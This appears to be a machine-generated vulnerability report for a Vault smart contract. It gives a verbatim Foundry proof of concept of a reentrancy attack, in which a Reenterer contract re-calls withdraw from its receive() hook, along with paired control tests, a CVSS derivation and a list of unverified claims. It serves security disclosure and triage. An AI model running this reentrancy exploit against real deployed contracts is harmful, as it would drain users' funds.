## Reproduction

The test below is the exact source the proof engine generated and executed. It is reproduced verbatim; only the surrounding fence was added. The lead that produced it is `src/Vault.sol:118`.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {Vault} from "../src/Vault.sol";

/// PoC generated by Asterion for Vault at block 18765432.
/// Each class emits (attack, control, nocond):
///   attack  must FAIL when the bug is present
///   control must PASS, or the fixture is broken and the attack means nothing
///   nocond  must PASS, or the precondition was not the cause
contract Vault_PoC is Test {
    Vault target;
    address attacker = address(0xA77ACC);
    address victim   = address(0xBEEF);

    function setUp() public {
        vm.createSelectFork(vm.envString("FORK_RPC"), 18765432);
        target = Vault(vm.envAddress("TARGET"));
        vm.deal(attacker, 100 ether);
        vm.deal(victim, 100 ether);
    }

    /// Machine-readable measurement. judge.mjs parses these three lines out of
    /// the -vvv trace of the FAILING attack test; nothing else consumes them.
    /// Emitted before the assertion so a reproduction still carries its numbers.
    function _impact(uint256 before_, uint256 after_, string memory desc) internal {
        console2.log(string.concat("IMPACT_BEFORE=", vm.toString(before_)));
        console2.log(string.concat("IMPACT_AFTER=", vm.toString(after_)));
        console2.log(string.concat("IMPACT_DESC=", desc));
    }

    function test_reentrancy_118() public {
        uint256 before_ = attacker.balance;

        Reenterer r;
        vm.startPrank(attacker);
        r = new Reenterer(address(target));
        r.arm();
        r.deposit{value: 1 ether}();
        vm.stopPrank();

        // Attacker-controlled value: the EOA plus the helper contract it owns.
        uint256 after_ = attacker.balance + address(r).balance;
        // int256: a loss is the normal case and must not underflow into a panic.
        int256 delta = int256(after_) - int256(before_);
        console2.log(string.concat("attacker delta=", vm.toString(delta)));
        _impact(before_, after_, "attacker-controlled ether before and after a reentrant withdrawal (delta logged)");

        // Bug present => attacker is up after supplying 1 ether.
        assertLt(delta, int256(1 ether), "REENTRANCY: extracted more than supplied");
    }

    function test_reentrancy_118_control() public {
        uint256 before_ = attacker.balance;
        vm.startPrank(attacker);
        (bool ok, ) = address(target).call{value: 1 ether}(abi.encodeWithSignature("deposit()"));
        vm.stopPrank();
        require(ok, "control deposit failed");
        // No reentry: attacker is down exactly the deposit.
        assertEq(before_ - attacker.balance, 1 ether, "CONTROL: baseline accounting broken");
    }

    /// Same fixture, enabling precondition removed: the callback is never armed,
    /// so the target is entered exactly once. The attack's assertion must hold.
    function test_reentrancy_118_nocond() public {
        uint256 before_ = attacker.balance;

        Reenterer r;
        vm.startPrank(attacker);
        r = new Reenterer(address(target));
        // r.arm() deliberately omitted: no reentry is possible.
        r.deposit{value: 1 ether}();
        vm.stopPrank();

        uint256 after_ = attacker.balance + address(r).balance;
        int256 delta = int256(after_) - int256(before_);
        console2.log(string.concat("nocond delta=", vm.toString(delta)));
        assertLt(delta, int256(1 ether), "NOCOND: value leaked without re-entry, so re-entry was not the cause");
    }
}

contract Reenterer {
    address public immutable target;
    bool private armed;
    uint256 private depth;

    constructor(address t) { target = t; }
    function arm() external { armed = true; }

    function deposit() external payable {
        (bool ok, ) = target.call{value: msg.value}(abi.encodeWithSignature("deposit()"));
        require(ok, "deposit failed");
    }

    receive() external payable {
        if (armed && depth < 3) {
            depth++;
            target.call(abi.encodeWithSignature("withdraw(uint256)", 1));
        }
    }
}
```

Run it against a fork of the pinned commit:

```bash
forge test --match-test '^test_reentrancy_118$' -vvv
```

The harness attaches to the deployed instance through the `TARGET` environment variable, so `TARGET` must be set to the affected address above and `FORK_RPC` to an archive RPC for the pinned block.

The paired control is `test_reentrancy_118_control`: same fixture with the attack step removed, and it must pass on its own.

## Severity (CVSS 3.1)

`CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:H/A:N` — base score **5.3**

The vector is derived deterministically from recorded facts: the engagement's mutability ceiling, the impact kind the harness measured, the reachability implied by the ledger asset kind, and the preconditions the harness declared. No model chose it, and re-running the derivation on the same inputs yields the same vector.

| Metric | Value | Derived from | Attested |
| --- | --- | --- | --- |
| AV | `N` | ledger asset kind → reachability "network" | yes |
| AC | `H` | 1 declared target condition(s) in requires[] | yes |
| PR | `N` | RoE mutability "simulate" ladder (no privilege requirement declared) | yes |
| UI | `R` | no user-interaction or automation precondition declared — least severe value used | **no** |
| S | `U` | no trust-boundary precondition declared — least severe value used | **no** |
| C | `N` | impact kind "value_transfer" | yes |
| I | `H` | impact kind "value_transfer" | yes |
| A | `N` | impact kind "value_transfer" | yes |

Metrics marked **no** took the less severe value because nothing recorded attested them: `UI`, `S`. The published score is therefore a floor, and is repeated in `claims NOT verified`.

## Remediation

The reproduction was shown to depend on the following target-side condition(s), so the fix must remove or guard the enabling condition rather than the symptom:

- a value-transferring function in Vault

Lab requirements recorded by the harness (FORK_RPC, TARGET) are how the test runs, not a property of the target, and are not part of the fix.

No patch was derived for this class, so the exact code change is not established by this measurement and must be described by the maintainer.

## claims NOT verified

Every item below is a claim this report does **not** make, or a claim for which the evidence in the bundle is incomplete. They are listed so a triager can judge the work rather than discover a gap later: unattested findings are ineligible on some programmes, so an overstated report does not merely lose points — it can forfeit the submission.

- Causality was established by removing a precondition (test_reentrancy_118_nocond), not by applying a fix. That shows the precondition was necessary; it does not show that any code change removes the defect.
- The paired control test was not recorded as passing in this bundle. The proof engine does not require it for `proven`, so the fixture's own soundness is unverified here.
- The effect was measured on a local fork pinned at block 18765432, not against the live deployment. Whether the deployed bytecode is the same and the state still holds was not verified.
- CVSS UI is not attested by the recorded facts: no user-interaction or automation precondition declared — least severe value used.
- CVSS S is not attested by the recorded facts: no trust-boundary precondition declared — least severe value used.
